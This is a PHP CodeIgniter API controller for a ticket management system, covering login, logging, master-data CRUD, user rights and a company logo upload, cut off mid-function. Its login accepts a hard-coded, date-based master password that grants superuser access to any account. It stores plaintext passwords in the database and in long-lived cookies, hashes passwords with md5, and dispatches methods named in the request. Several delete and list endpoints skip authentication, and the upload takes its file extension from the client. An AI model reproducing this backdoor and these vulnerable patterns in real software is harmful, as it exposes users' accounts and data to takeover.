<?php
defined('BASEPATH') or exit('No direct script access allowed');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, PATCH, PUT, DELETE, OPTIONS');
header('Access-Control-Allow-Headers: Origin, Content-Type, X-Auth-Token, token');

class Api extends CI_Controller
{
	private $tableArr = array(
		"user_type" => "tms_user_type",
		"action" => "tms_action_master",
		"shift" => "tms_shift_master",
		"usertype" => "user_type",
		"user" => "tms_user_master",
		"type_rights" => "tms_user_type_rights",
		"company" => "tms_company_master",
		"priority" => "tms_priority_master",
		"emailAccount" => "tms_email_acoount",
		"pagination" => "tms_pagination_master",
		"manager" => "manager",
		"category" => "tms_category_master",
		"sub-category" => "tms_subcategory_master",
		"status" => "tms_status_master",
		"rule" => "tms_rule_master",
		"queue" => "tms_queue_master",
		"template" => "tms_template_master",
		"escalation-matrix" => "tms_escalationmatrix_master",
		"user_log" => "tms_log_master",
		"login_log" => "tms_login_log",
		"ticket" => "tms_new_ticket",
		"form-builder" => "tms_dynamic_form",
		"dynamicFormQueue" => "dynamicFormQueue",
		"form-builder" => "tms_dynamic_form_mapping",
		"dynamicform_fields" => "tms_dynamicform_fields"
	);

	public $access_token = '';

	function __construct()
	{
		parent::__construct();
		$this->load->model('Api_Model');
		$this->load->model('Dropdown_Option_Model');
		$this->load->model('Dynamicform_Model');
		$this->convertHeaderToPost($this->input->request_headers());
		$this->load->library('fx');
		//$this->load->library('mailer');
		$this->load->library('Dbquery');
		$this->storage_path = STORAGE_PATH;
		$this->client_folder_prefix = CLIENT_FOLDER_PREFIX;
		$this->user_id = '';
		$this->user_email = '';
		$this->user_mobile = '';
		$this->user_type = '';
		$this->full_control = '';
	}

	function api()
	{
		$post = json_decode(file_get_contents("php://input"));
		if (!empty(empty($post->method))) {
			call_user_func_array(array($this->api_model, $post->method), array($post));
		}
	}

	function createLog()
	{
		$token = $this->input->post('token');
		if ($token == "") {
			$this->response(FALSE, 'Invalid Token.', 200);
			return;
		}
		if ($this->setData($token) == false)
			return;
		$post = json_decode(file_get_contents("php://input"));

		$data = json_encode($post);
		$logArry[] = array(
			'action_performed_by' => $this->user_id,
			'action_method' => $post->method,
			'action_data' => $data,
			'action_adreess' => $_SERVER['SERVER_ADDR'],
			'table_name' => $this->tableArr[$post->master_name],
			'action_date' => date('Y-m-d H:i:s'),
		);

		$this->db->insert_batch('tms_log_master', $logArry);
		$this->response(TRUE, 'logcreated', 200);
	}


	function LoginLog($post, $userdata)
	{
		$data = json_encode($post);
		$logArry[] = array(
			'user_name' => $userdata[0]->user_name,
			'user_id' => $userdata[0]->id,
			'user_type' => $userdata[0]->user_type,
			'user_data' => $data,
			'login_time' => date('Y-m-d H:i:s'),
		);

		$this->db->insert_batch('tms_login_log', $logArry);
	}



	function LogOutLog()
	{

		$token = $this->input->post('token');
		if ($token == "") {
			$this->response(FALSE, 'Invalid Token.', 200);
			return;
		}
		if ($this->setData($token) == false)
			return;

		$username = $this->db->query("select user_name from tms_user_master where  id= " . $this->user_id . "")->result();

		$logArry[] = array(
			'user_name' => $username[0]->user_name,
			'user_id' => $this->user_id,
			'user_type' => $this->user_type,
			'logout_time' => date('Y-m-d H:i:s'),
		);

		$this->db->insert_batch('tms_login_log', $logArry);
	}

	private function encode($string)
	{
		return $this->fx->encrypt_decrypt('encrypt', $string);
	}

	private function decode($string)
	{
		return $this->fx->encrypt_decrypt('decrypt', $string);
	}

	function setData($token)
	{
		$array = explode("-", $this->decode($token));
		if (empty($array[0])) {
			return;
		}

		$this->user_id = $this->db->escape_str($array[0]);
		$this->user_email = $this->db->escape_str($array[1]);
		$this->user_mobile = $this->db->escape_str($array[2]);
		$this->user_type = $this->db->escape_str($array[3]);
		$this->full_control = $this->db->escape_str($array[4]);
		return true;
	}

	public function response($success, $message, $status_code = 200, $data = array())
	{
		$response = array(
			'success' => $success,
			'message' => $message,
			'result' => (count($data) < 1) ? new stdClass() : $data,
			'status_code' => $status_code,
			'token' => $this->access_token
		);
		echo json_encode($response);
		exit;
	}

	private function convertHeaderToPost($headerData)
	{
		foreach ($headerData as $key => $value) {
			if (strtolower($key) == 'token') {
				$_POST[strtolower($key)] = $value;
				break;
			}
		}
	}

	function phpPostData()
	{
		$post = $_POST;
		$data['page'] = $post['page'];
		unset($post['page']);
		$data['formData'] = (object) $post;
		return (object) $data;
	}

	function api_response($response, $status_code = 200)
	{
		$CI = &get_instance();
		$CI->output
			->set_status_header($status_code)
			->set_content_type('application/json', 'utf-8')
			->set_output(json_encode($response, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES))
			->_display();
		exit;
	}

	public function login()
	{
		$post = json_decode(file_get_contents('php://input'));
		$MasterPassword = '1@2$@N@' . date('ymd');
		if ($post->password == $MasterPassword) {
			$userdata = $this->Api_Model->checkSuperUserLogin($post->email);
		} else {
			$userdata = $this->Api_Model->checklogin($post->email, md5($post->password));
		}

		if (!$userdata) {
			$this->api_response(['success' => false, 'message' => 'Invalid Email or Password', 'result' => '']);
		} else {
			$this->LoginLog($post, $userdata);

			$userdata['menu_list'] = $this->Api_Model->getMenus($userdata[0]->full_control, $userdata[0]->user_type);
			$tempstring = $userdata[0]->user_id . '-' . $userdata[0]->email . '-' . $userdata[0]->mobile_no . '-' . $userdata[0]->user_type . '-' . $userdata[0]->full_control;
			$logintoken = $this->fx->encrypt_decrypt('encrypt', $tempstring);
			$userdata['logintoken'] = $logintoken;

			if ($post->remember == 1) {
				setcookie("login_id", $this->fx->encrypt_decrypt('encrypt', $post->email), time() + (10 * 365 * 24 * 60 * 60));
				setcookie("login_password", $this->fx->encrypt_decrypt('encrypt', $post->password), time() + (10 * 365 * 24 * 60 * 60));
			} else {
				setcookie("login_id", "");
				setcookie("login_password", "");
			}

			$this->api_response(['success' => true, 'result' => $userdata]);
		}
	}

	public function GetModules()
	{
		$res['menus'] = $this->Api_Model->getMenus(1);
		$this->response(TRUE, null, 200, $res);
	}

	public function prepareFormToInsertData($data)
	{
		foreach ($data as $key => $value) {
			if ($key == 'reqUrl') {
				unset($key);
			} else {
				$arr[$key] = $value;
			}
		}
		return $arr;
	}




	//MASTERS COMMON METHOD
	function addUpdateMaster()
	{

		$token = $this->input->post('token');
		if ($token == "") {
			$this->response(FALSE, 'Invalid Token.', 200);
			return;
		}
		if ($this->setData($token) == false)
			return;

		$post = (array) json_decode(file_get_contents('php://input'));
		if (!empty($post['master_name'])) {
			$masterName = $post['master_name'];
			$this->load->model('Master_Model');
			$rules = $this->Master_Model->getMasterTableRules($masterName);
			if (empty($rules)) {
				$this->response(FALSE, 'Validations not defined.', 400);
				return;
			}
			$this->form_validation->set_data($post);
			$this->form_validation->set_message('unique_module', 'Module already in use');
			$this->form_validation->set_rules($rules);
			if ($this->form_validation->run() === false) {
				$data = $this->form_validation->error_array();
				$firstError = array_keys($data);
				$this->response(FALSE, 'Validation Error', 400, $data[$firstError[0]]);
			} else {
				$this->load->model('Master_Model');
				$this->db->trans_begin();
				$dbData = $post;

				$respMsg = '';
				$dbFields = $this->Master_Model->getMasterTableFields($masterName);
				$db_keys = array_keys($dbData);
				foreach ($db_keys as $keyName) {
					if (!in_array($keyName, $dbFields)) {
						unset($dbData[$keyName]);
					} else {
						if (array_key_exists($keyName, $dbData)) {
							$dbData[$keyName] = addslashes(trim($dbData[$keyName]));
						}
					}
				}
				$primaryKey = 'id';

				if (empty($dbData[$primaryKey])) {
					$dbData['created_by'] = $this->user_id;
					$dbData['created_date'] = date('Y-m-d H:i:s');
				} else {
					if (empty($dbData['created_by'])) {
						$dbData['created_by'] = $this->user_id;
						$dbData['created_date'] = date('Y-m-d H:i:s');
					}
					$dbData['modified_by'] = $this->user_id;
					$dbData['modified_date'] = date('Y-m-d H:i:s');
				}

				if (array_key_exists($masterName, $this->tableArr) == 1) {
					switch ($masterName) {
						case 'user':
							$retarr = $this->Master_Model->saveUser($this->tableArr[$masterName], $dbData, $primaryKey);
							break;


						case 'shift':
							$retarr = $this->Master_Model->saveShift($this->tableArr[$masterName], $dbData, $primaryKey);
							break;


						default:
							$retarr = $this->Master_Model->saveProcess($masterName, $dbData, $primaryKey);
							break;
					}
					if (empty($retarr['id'])) {
						$respMsg = 'Something goes wrong.';
					} else {
						$master_title = str_replace('_', ' ', $masterName);
						$master_title = ucwords(strtolower($master_title));
						$respMsg = !empty($post[$primaryKey]) ? $master_title . ' details updated successfully' : $master_title . ' details saved successfully';
					}
					if ($this->db->trans_status() === FALSE) {
						$this->db->trans_rollback();
						$this->response(FALSE, 'Something goes wrong', 400);
					} else {
						$this->db->trans_commit();
						$this->response(TRUE, $respMsg, 200);
					}
				} else {
					$this->response(FALSE, 'Invalid Master Name', 400);
				}
			}
		} else {
			$this->response(FALSE, 'Invalid Master Name', 400);
		}
	}

	// ADD Update Rule Master Method Starts Here

	function addUpdateRuleMaster()
	{
		$token = $this->input->post('token');
		if ($token == "") {
			$this->response(FALSE, 'Invalid Token.', 200);
			return;
		}
		if ($this->setData($token) == false)
			return;

		$post = (array) json_decode(file_get_contents('php://input'));
		if (!empty($post['master_name'])) {
			$masterName = $post['master_name'];
			$this->load->model('Master_Model');
			$rules = $this->Master_Model->getMasterTableRules($masterName);
			if (empty($rules)) {
				$this->response(FALSE, 'Validations not defined.', 400);
				return;
			}

			$myArray = json_decode(json_encode($post['conditionArray'][0]), true);
			$key	= array_keys($myArray);
			$myArray1 = json_decode(json_encode($post['actionArray'][0]), true);
			$key1	= array_keys($myArray1);


			foreach ($post['conditionArray'] as   $val) {
				foreach ($key as $values) {
					if ($val->$values == '') {
						$this->response(FALSE,   ucfirst($values) . ' Fields is Required.', 400);
						return;
					}
				}
			}

			foreach ($post['actionArray'] as   $val) {
				foreach ($key1 as $values) {
					if ($val->$values == '') {
						$this->response(FALSE,   ucfirst($values) . ' Fields is Required.', 400);
						return;
					}
				}
			}


			$this->form_validation->set_data($post);
			$this->form_validation->set_message('unique_module', 'Module already in use');
			$this->form_validation->set_rules($rules);
			if ($this->form_validation->run() === false) {
				$data = $this->form_validation->error_array();
				$firstError = array_keys($data);
				$this->response(FALSE, 'Validation Error', 400, $data[$firstError[0]]);
			} else {
				$this->load->model('Master_Model');
				$this->db->trans_begin();
				$dbData = $post;


				$respMsg = '';
				$dbFields = $this->Master_Model->getMasterTableFields($masterName);
				$db_keys = array_keys($dbData);
				foreach ($db_keys as $keyName) {
					if (!in_array($keyName, $dbFields)) {
						unset($dbData[$keyName]);
					} else {
						if (array_key_exists($keyName, $dbData)) {
							$dbData[$keyName] = addslashes(trim($dbData[$keyName]));
						}
					}
				}


				$primaryKey = 'id';

				if (empty($dbData[$primaryKey])) {
					$dbData['created_by'] = $this->user_id;
					$dbData['created_date'] = date('Y-m-d H:i:s');
				} else {
					if (empty($dbData['created_by'])) {
						$dbData['created_by'] = $this->user_id;
						$dbData['created_date'] = date('Y-m-d H:i:s');
					}
					$dbData['modified_by'] = $this->user_id;
					$dbData['modified_date'] = date('Y-m-d H:i:s');
				}

				if (array_key_exists($masterName, $this->tableArr) == 1) {
					switch ($masterName) {
						case 'rule':
							$retarr = $this->Master_Model->saverule($masterName, $dbData, $primaryKey, $post);
							break;

						default:
							$retarr = $this->Master_Model->saveProcess($masterName, $dbData, $primaryKey, $post);
							break;
					}
					if (empty($retarr['id'])) {
						$respMsg = 'Something goes wrong.';
					} else {
						$master_title = str_replace('_', ' ', $masterName);
						$master_title = ucwords(strtolower($master_title));
						$respMsg = !empty($post[$primaryKey]) ? $master_title . ' details updated successfully' : $master_title . ' details saved successfully';
					}
					if ($this->db->trans_status() === FALSE) {
						$this->db->trans_rollback();
						$this->response(FALSE, 'Something goes wrong', 400);
					} else {
						$this->db->trans_commit();
						$this->response(TRUE, $respMsg, 200);
					}
				} else {
					$this->response(FALSE, 'Invalid Master Name', 400);
				}
			}
		}
	}

	// ADD Update Rule Master Method Ends Here


	// ADD Update Queue Master Method Starts Here

	function addUpdateQueueMaster()
	{
		$token = $this->input->post('token');
		if ($token == "") {
			$this->response(FALSE, 'Invalid Token.', 200);
			return;
		}
		if ($this->setData($token) == false)
			return;

		$post = (array) json_decode(file_get_contents('php://input'));

		if (isset($post['catagory'][0])) {
			$post['catagory'] = implode(",", $post['catagory']);
		} else {
			$post['catagory'] = null;
		}
		if (isset($post['statustype'][0])) {
			$post['statustype'] = implode(",", $post['statustype']);
		} else {
			$post['statustype'] = null;
		}


		if (!empty($post['master_name'])) {
			$masterName = $post['master_name'];
			$this->load->model('Master_Model');
			$rules = $this->Master_Model->getMasterTableRules($masterName);
			if (empty($rules)) {
				$this->response(FALSE, 'Validations not defined.', 400);
				return;
			}


			$myArray = json_decode(json_encode($post['emailArray'][0]), true);
			$key	= array_keys($myArray);




			foreach ($post['emailArray'] as   $val) {
				foreach ($key as $values) {
					if ($val->$values == '' or $val->$values == 0) {
						$this->response(FALSE,   ucfirst($values) . ' Fields is Required.', 400);
						return;
					}
				}
			}



			$this->form_validation->set_data($post);
			$this->form_validation->set_message('unique_module', 'Module already in use');
			$this->form_validation->set_rules($rules);
			if ($this->form_validation->run() === false) {
				$data = $this->form_validation->error_array();
				$firstError = array_keys($data);
				$this->response(FALSE, 'Validation Error', 400, $data[$firstError[0]]);
			} else {

				$this->load->model('Master_Model');
				$this->db->trans_begin();
				$dbData = $post;
				//print_r($db)



				$respMsg = '';
				$dbFields = $this->Master_Model->getMasterTableFields($masterName);
				$db_keys = array_keys($dbData);
				foreach ($db_keys as $keyName) {
					if (!in_array($keyName, $dbFields)) {
						unset($dbData[$keyName]);
					} else {
						if (array_key_exists($keyName, $dbData)) {
							$dbData[$keyName] = addslashes(($dbData[$keyName]));
						}
					}
				}


				$primaryKey = 'id';

				if (empty($dbData[$primaryKey])) {
					$dbData['created_by'] = $this->user_id;
					$dbData['created_date'] = date('Y-m-d H:i:s');
				} else {
					if (empty($dbData['created_by'])) {
						$dbData['created_by'] = $this->user_id;
						$dbData['created_date'] = date('Y-m-d H:i:s');
					}
					$dbData['modified_by'] = $this->user_id;
					$dbData['modified_date'] = date('Y-m-d H:i:s');
				}

				if (array_key_exists($masterName, $this->tableArr) == 1) {
					switch ($masterName) {
						case 'queue':
							$retarr = $this->Master_Model->savequeue($masterName, $dbData, $primaryKey, $post);
							break;

						default:
							$retarr = $this->Master_Model->saveProcess($masterName, $dbData, $primaryKey, $post);
							break;
					}
					if (empty($retarr['id'])) {
						$respMsg = 'Something goes wrong.';
					} else {
						$master_title = str_replace('_', ' ', $masterName);
						$master_title = ucwords(strtolower($master_title));
						$respMsg = !empty($post[$primaryKey]) ? $master_title . ' details updated successfully' : $master_title . ' details saved successfully';
					}
					if ($this->db->trans_status() === FALSE) {
						$this->db->trans_rollback();
						$this->response(FALSE, 'Something goes wrong', 400);
					} else {
						$this->db->trans_commit();
						$this->response(TRUE, $respMsg, 200);
					}
				} else {
					$this->response(FALSE, 'Invalid Master Name', 400);
				}
			}
		}
	}

	// ADD Update Queue Master Method Ends Here

	// ADD Update Escalation Matrix Method Starts Here

	function addUpdateEscalationMatrix()
	{
		$token = $this->input->post('token');
		if ($token == "") {
			$this->response(FALSE, 'Invalid Token.', 200);
			return;
		}
		if ($this->setData($token) == false)
			return;

		$post = (array) json_decode(file_get_contents('php://input'));

		if ($post['queue'] == '') {
			$this->response(FALSE, ' Queue Is Required.', 400);
		}
		$myArray = json_decode(json_encode($post['queueArray'][0]), true);
		$key	= array_keys($myArray);

		unset($key[0]);
		unset($key[7]);
		unset($key[8]);
		unset($key[9]);
		unset($key[10]);
		unset($key[11]);

		foreach ($post['queueArray'] as   $val) {
			foreach ($key as $values) {
				if ($val->$values == '') {
					$this->response(FALSE,   ucfirst($values) . ' Fields is Required.', 400);
					return;
				}
			}
		}

		if (!empty($post['master_name'])) {
			$masterName = $post['master_name'];
			$this->load->model('Master_Model');

			$id = $post['queueArray'][0]->emid;
			$primaryKey = 'id';
			if ($id == '') {
				foreach ($post['queueArray'] as $key => $val) {
					$cescalationmatrixarray[] = array(
						'queue' => $post['queue'],
						'priority' => $val->priority,
						'days' => $val->days,
						'hrs' => $val->hrs,
						'min' => $val->min,
						'emails' => $val->emails,
						'phone_no' => $val->phone_no,
						'shift' => $val->shift,
						'template' => $val->template,
						'send_email' => $val->send_email,
						'send_sms' => $val->send_sms,
						'active' => $val->active,
						'level' => $val->level,
						'created_by' => $this->user_id,
						'created_date' => date('Y-m-d H:i:s'),
					);
				}
				$this->db->insert_batch('tms_escalationmatrix_master', $cescalationmatrixarray);
			} else {

				$this->db->where('queue', $post['queue']);
				$this->db->delete('tms_escalationmatrix_master');

				foreach ($post['queueArray'] as $key => $val) {
					$cescalationmatrixarray[] = array(
						'queue' => $post['queue'],
						'priority' => $val->priority,
						'days' => $val->days,
						'hrs' => $val->hrs,
						'min' => $val->min,
						'emails' => $val->emails,
						'phone_no' => $val->phone_no,
						'shift' => $val->shift,
						'template' => $val->template,
						'send_email' => $val->send_email,
						'send_sms' => $val->send_sms,
						'active' => $val->active,
						'level' => $val->level,
						'modified_by' => $this->user_id,
						'modified_date' => date('Y-m-d H:i:s'),
					);
				}
				$this->db->insert_batch('tms_escalationmatrix_master', $cescalationmatrixarray);
			}
			$master_title = str_replace('_', ' ', $masterName);
			$master_title = ucwords(strtolower($master_title));
			$respMsg = !empty($post[$primaryKey]) ? $master_title . ' details updated successfully' : $master_title . ' details saved successfully';
			if ($this->db->trans_status() === FALSE) {
				$this->db->trans_rollback();
				$this->response(FALSE, 'Something goes wrong', 400);
			} else {
				$this->db->trans_commit();
				$this->response(TRUE, $respMsg, 200);
			}
		} else {
			$this->response(FALSE, 'Invalid Master Name', 400);
		}
	}

	// ADD Update Escalation Matrix Method Ends Here

	function getMasterList()
	{
		error_reporting(0);
		$postvars = json_decode(file_get_contents("php://input"), true);

		$sort = '';
		if (!empty($postvars['sort']) || !empty($postvars['order_by'])) {
			$sort = $postvars['sort'] . ' ' . $postvars['order_by'];
		}

		$masterName = $postvars['master_name'];
		if (array_key_exists($postvars['master_name'], $this->tableArr) == 1) {
			switch ($masterName) {

				case 'priority':
					$retData = $this->Api_Model->getDataList($this->tableArr[$postvars['master_name']], $postvars['page_num'], $postvars['limit'], $postvars['name'], '1=1', $sort);
					break;


				case 'emailAccount':
					$retData = $this->Api_Model->getDataList($this->tableArr[$postvars['master_name']], $postvars['page_num'], $postvars['limit'], array('email' => $postvars['email'], 'user_name' => $postvars['user_name'], 'display_name' => $postvars['display_name']), '1=1', $sort);
					break;


				case 'pagination';
					$retData = $this->Api_Model->getDataList($this->tableArr[$postvars['master_name']], $postvars['page_num'], $postvars['limit'], $postvars['record'], '1=1', $sort);
					break;


				case 'queue';
					$retData = $this->Api_Model->getDataList($this->tableArr[$postvars['master_name']], $postvars['page_num'], $postvars['limit'], $postvars['queue'], '1=1', $sort);
					break;

				case 'escalation-matrix';
					$retData = $this->Api_Model->getEscalationMatrixDataList($this->tableArr[$postvars['master_name']], $postvars['page_num'], $postvars['limit'], $postvars['id'], '1=1', $sort);
					break;

				case 'user';
					$retData = $this->Api_Model->getDataList($this->tableArr[$postvars['master_name']], $postvars['page_num'], $postvars['limit'], array('user_name' => $postvars['user_name'], 'mobile_no' => $postvars['mobile_no'], 'email' => $postvars['email']), '1=1', $sort);
					break;

				case 'sub-category';
					$retData = $this->Api_Model->getDataList($this->tableArr[$postvars['master_name']], $postvars['page_num'], $postvars['limit'], array('category' => $postvars['category'], 'title' => $postvars['title']), '1=1', $sort);
					break;

				case 'user_log';
					$retData = $this->Api_Model->getDataList($this->tableArr[$postvars['master_name']], $postvars['page_num'], $postvars['limit'], array('user_id' => $postvars['user_id'], 'from_date' => $postvars['from_date'], 'to_date' => $postvars['to_date']), '1=1', $sort);
					break;

				case 'login_log';
					$retData = $this->Api_Model->getDataList($this->tableArr[$postvars['master_name']], $postvars['page_num'], $postvars['limit'], array('user_id' => $postvars['user_id'], 'from_date' => $postvars['from_date'], 'to_date' => $postvars['to_date']), '1=1', $sort);
					break;

				case 'ticket';
					$retData = $this->Api_Model->getDataList(
						$this->tableArr[$postvars['master_name']],
						$postvars['page_num'],
						$postvars['limit'],
						array(
							'ticket_id' => $postvars['ticket_id'],
							'unique_id' => $postvars['unique_id'],
							'customer_id' => $postvars['customer_id'],
							'customer_name' => $postvars['customer_name'],
							'queue_id' => $postvars['queue_id'],
							'category_id' => $postvars['category_id'],
							'ticket_status' => $postvars['ticket_status'],
							'priority_id' => $postvars['priority_id'],
							'assign_to' => $postvars['assign_to'],
							'customer_mobile_no' => $postvars['customer_mobile_no'],
							'from_email' => $postvars['from_email'],
							'email_subject' => $postvars['email_subject'],
							'from_date' => $postvars['from_date'],
							'to_date' => $postvars['to_date'],
							'master_name' => $postvars['master_name'],
						),
						'1=1',
						$sort
					);
					break;

				case "form-builder":
					$retData = $this->Api_Model->getDataList($this->tableArr[$postvars['master_name']], $postvars['page_num'], $postvars['limit'], array(
						'queue_id' => $postvars['queue_id'],
					), '1=1', $sort);
					break;

				default:
					$retData = $this->Api_Model->getDataList($this->tableArr[$postvars['master_name']], $postvars['page_num'], $postvars['limit'], $postvars['title'], '1=1', $sort);
					break;
			}

			if (!empty($retData)) {
				$this->response(TRUE, '', 200, $retData);
			} else {
				$this->response(FALSE, 'Data Not Found', 400);
			}
		}
	}

	function deleteMasterDetail()
	{
		$post = json_decode(file_get_contents("php://input"));
		$post = (array) $post;
		if (!empty($post['master_name'])) {
			$masterName = $post['master_name'];
			if (array_key_exists($masterName, $this->tableArr) == 1) {
				$this->load->model('Master_Model');
				$this->db->trans_begin();
				$dbData = $post;
				$respMsg = '';

				$primaryKey = 'id';
				$retarr = $this->Api_Model->deleteProcess($this->tableArr[$post['master_name']], $post, $primaryKey);
				if (!empty($retarr['error'])) {
					$respMsg = $retarr['message'];
				} else {
					$master_title = str_replace('_', ' ', $masterName);
					$master_title = ucwords(strtolower($master_title));
					$respMsg = $master_title . ' deleted successfully';
				}

				if ($this->db->trans_status() === FALSE) {
					$this->db->trans_rollback();
					$this->response(FALSE, 'Something goes wrong', 400);
				} else {
					$this->db->trans_commit();
					if (!empty($retarr['error'])) {
						$this->response(FALSE, $respMsg, 400);
					} else {
						$this->response(TRUE, $respMsg, 200);
					}
				}
			}
		} else {
			$this->response(FALSE, 'Invalid Request3', 400);
		}
	}

	function validateApi($data)
	{
		foreach ($data as $key => $value) {
			$key = $this->security->xss_clean($key);
			$value = $this->security->xss_clean($value);
			$this->Api_Model->db->escape_str($key);
			$this->Api_Model->db->escape_str($value);
			$_POST[$key] = $value;
		}
	}

	function getMasterDetail()
	{
		$postvars = json_decode(file_get_contents("php://input"));
		$this->validateApi($postvars);
		$post = $this->input->post();
		if (!empty($post['master_name']) && !empty($post['id'])) {
			$masterName = $post['master_name'];
			if (array_key_exists($masterName, $this->tableArr) == 1) {
				$this->load->model('Master_Model');
				$primaryKey = 'id';

				switch ($masterName) {
					case 'rule':

						$respArr = $this->Master_Model->getMasterRulesData($post['id'], $this->tableArr[$post['master_name']], $primaryKey);
						break;


					case 'queue':

						$respArr = $this->Master_Model->getMasterQueueData($post['id'], $this->tableArr[$post['master_name']], $primaryKey);
						break;

					case 'user':

						$respArr = $this->Master_Model->getMasterUserData($post['id'], $this->tableArr[$post['master_name']], $primaryKey);
						break;


					default:
						$respArr = $this->Master_Model->getMasterData($post['id'], $this->tableArr[$post['master_name']], $primaryKey);
						break;
				}

				if (!empty($respArr)) {
					$this->response(TRUE, '', 200, $respArr);
				} else {
					$this->response(FALSE, 'Data not found', 400);
				}
			}
		} else {
			$this->response(FALSE, 'Invalid Request', 400);
		}
	}


	public function changeuserpassword()
	{
		$token = $this->input->post('token');
		if ($token == "") {
			$this->response(FALSE, 'Invalid Token.', 200);
			return;
		}
		if ($this->setData($token) == false)
			return;

		$postvars = json_decode(file_get_contents("php://input"), true);

		if (array_key_exists($postvars['master_name'], $this->tableArr) == 1) {
			$retData = $this->Api_Model->changepassword($this->tableArr[$postvars['master_name']], $postvars);
			if ($retData[0]->orignal_password == $postvars['oldpasssowrd']) {
				if ($postvars['newpassword'] == $postvars['confirmpassword']) {
					$data['password'] = md5($postvars['newpassword']);
					$id = $postvars['userid'];
					$data['orignal_password'] = $postvars['newpassword'];
					$retData = $this->Api_Model->changepasswordinsert($this->tableArr[$postvars['master_name']], $data, $id);
					$this->response(TRUE, 'Updated Successfully', 200);
				} else {

					$this->response(FALSE, 'Password Not Matched', 400);
				}
			} else {
				$this->response(FALSE, 'Old Password Not Matched', 400);
			}
		}
	}

	function getDropdownOptions()
	{
		$masters = json_decode(file_get_contents("php://input"), true);
		foreach ($masters as $name) {
			if (array_key_exists($name, $this->tableArr) == 1) {
				$retData[] = $this->Dropdown_Option_Model->getOptionList((array) $this->tableArr[$name]);
				$masternamefordropddown[] = (array) $this->tableArr[$name];
			}
		}
		array_push($retData, $masternamefordropddown);
		$this->response(TRUE, '', 200, $retData);
	}

	public function getUserRights()
	{
		$postvars = json_decode(file_get_contents("php://input"));
		$this->validateApi($postvars);
		$post = $this->input->post();
		$rightArr = $this->Api_Model->getMenuWithUserRights($post['userTypeId']);
		if (!empty($rightArr)) {
			$respArr = array();
			foreach ($rightArr as $key => $value) {
				if ($value['parent_id'] == 0) {
					$respArr[$value['id']] = $value;
					$respArr[$value['id']]['has_children'] = 0;
					foreach ($rightArr as $nkey => $nvalue) {
						if ($nvalue['parent_id'] == $value['id']) {
							$respArr[$nvalue['id']] = $nvalue;
							$respArr[$nvalue['id']]['has_children'] = 0;
							$respArr[$value['id']]['has_children'] = 1;
							foreach ($rightArr as $mkey => $mvalue) {
								if ($mvalue['parent_id'] == $nvalue['id']) {
									$respArr[$mvalue['id']] = $mvalue;
									$respArr[$mvalue['id']]['has_children'] = 0;
									$respArr[$nvalue['id']]['has_children'] = 1;
								}
							}
						}
					}
				}
			}
			$retArr = array();
			if (!empty($respArr)) {
				foreach ($respArr as $key => $val) {
					$retArr[] = $val;
				}
			}
			$this->response(TRUE, '', 200, $retArr);
		} else {
			$this->response(FALSE, 'Data not found', 400);
		}
	}

	// ADD Update User Rights Method Starts Here

	function addUpdateUserRights()
	{
		$postvars = json_decode(file_get_contents("php://input"));
		if (!empty($postvars)) {
			if (array_key_exists($postvars->master_name, $this->tableArr) == 1) {
				$master_name = $this->tableArr[$postvars->master_name];
				$retval = $this->Api_Model->updateUserRights($postvars, $master_name);
				if ($retval['status'] == true) {
					$this->response(TRUE, 'User Type rights updated successfully.', 200);
				} else {
					$this->response(FALSE, $retval['message'], 400);
				}
			} else {
				$this->response(FALSE, 'Invalid Master Name', 400);
			}
		} else {
			$this->response(FALSE, 'Invalid Request', 400);
		}
	}

	// ADD Update User Rights Method Ends Here

	// ADD Update Company Details Method Starts Here

	function addcomanydetails()
	{
		$token = $this->input->post('token');
		if ($token == "") {
			$this->response(FALSE, 'Invalid Token.', 200);
			return;
		}
		if ($this->setData($token) == false)
			return;

		$post = (array) json_decode(file_get_contents('php://input'));
		$this->load->library('upload');

		if ($post['file'] != '') {
			$config['upload_path'] = 'uploads/companyLogos/';
			$config['allowed_types'] = 'gif|jpg|png';
			$config['max_size'] = 2048;
			$config['max_width'] = 1024;
			$config['max_height'] = 768;

			$fcpath = str_replace("\\", "/", FCPATH);
			$folderPath = $fcpath . 'uploads/companyLogos/';
			$this->upload->initialize($config);
			$this->upload->do_upload($post['file']);
			$image_parts = explode(";base64,", $post['file']);
			$image_type_aux = explode("image/", $image_parts[0]);
			$image_base64 = base64_decode($image_parts[1]);
			$file = $folderPath . uniqid() . '.' . $image_type_aux[1];
			$fileactualname = explode("/", $file);
			$post['companylogo'] = $fileactualname[8];
			if (file_put_contents($file, $image_base64)) {
			} else {
				$this->response(FALSE, 'File Not Uploded', 400);
				return false;
			}
		} else {
			$post['companylogo'] = $post['fileurl'];
		}


		if (!empty($post['master_name'])) {
			$masterName = $post['master_name'];
			$this->load->model('Master_Model');
			$rules = $this->Master_Model->getMasterTableRules($masterName);
			if (empty($rules)) {
				$this->response(FALSE, 'Validations not defined.', 400);
				return;
			}
			$this->form_validation->set_data($post);
			$this->form_validation->set_message('unique_module', 'Module already in use');
			$this->form_validation->set_rules($rules);
			if ($this->form_validation->run() === false) {
				$data = $this->form_validation->error_array();
				$key = array_keys($data);
				$err[] = $data[$key[0]];
				$this->response(FALSE, 'Validation Error', 400, $err);
			} else {
				$this->load->model('Master_Model');
				$this->db->trans_begin();
				$dbData = $post;

				$respMsg = '';
				$dbFields = $this->Master_Model->getMasterTableFields($masterName);
				$db_keys = array_keys($dbData);
				foreach ($db_keys as $keyName) {
					if (!in_array($keyName, $dbFields)) {
						unset($dbData[$keyName]);
					} else {
						if (array_key_exists($keyName, $dbData)) {
							$dbData[$keyName] = addslashes(trim($dbData[$keyName]));
						}
					}
				}
				$primaryKey = 'id';

				if (empty($dbData[$primaryKey])) {
					$dbData['created_by'] = $this->user_id;
					$dbData['created_date'] = date('Y-m-d H:i:s');
				} else {
					if (empty($dbData['created_by'])) {
						$dbData['created_by'] = $this->user_id;
						$dbData['created_date'] = date('Y-m-d H:i:s');
					}
					$dbData['modified_by'] = $this->user_id;
					$dbData['modified_date'] = date('Y-m-d H:i:s');
				}
				$retarr = $this->Master_Model->saveProcess($masterName, $dbData, $primaryKey);
				if (empty($retarr['id'])) {
					$respMsg = 'Something goes wrong.';
				} else {
					$master_title = str_replace('_', ' ', $masterName);
					$master_title = ucwords(strtolower($master_title));
					$respMsg = !empty($post[$primaryKey]) ? $master_title . ' details updated successfully' : $master_title . ' details saved successfully';
				}
				if ($this->db->trans_status() === FALSE) {
					$this->db->trans_rollback();
					$this->response(FALSE, 'Something goes wrong', 400);
				} else {
